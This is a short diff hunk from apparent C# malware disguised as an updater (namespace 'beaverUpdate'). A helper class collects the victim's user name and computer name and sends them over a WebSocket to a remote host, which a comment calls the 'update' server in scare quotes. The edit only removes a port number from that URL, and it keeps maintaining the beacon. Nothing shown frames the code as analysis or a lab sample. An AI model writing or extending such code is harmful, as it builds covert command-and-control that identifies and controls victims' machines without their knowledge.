@@ -28,7 +28,7 @@ namespace beaverUpdate
             // Connect to the "update" server
             ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
             var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
-            var socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com:8080/checkupdate?client={client}"));
+            var socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com/checkupdate?client={client}"));
             
 
             // Start the task flow
